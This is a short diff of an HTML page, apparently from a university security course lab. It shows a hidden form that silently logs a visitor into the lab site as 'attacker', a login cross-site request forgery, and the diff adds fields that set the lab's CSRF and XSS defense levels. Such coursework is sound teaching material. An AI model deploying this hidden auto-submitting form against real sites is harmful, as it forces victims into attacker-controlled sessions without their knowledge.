@@ -16,6 +16,8 @@
   <form id="form" name="form" action="http://eecs388.org/project2/login" method="POST" target="hidden_frame">
     <input type="hidden" name="username" value="attacker">
     <input type="hidden" name="password" value="l33th4x">
+    <input type="hidden" name="csrfdefense" value="0">
+    <input type="hidden" name="xssdefense" value="4">
   </form>
 <script>
   document.getElementById("hidden_frame").style.display="none";
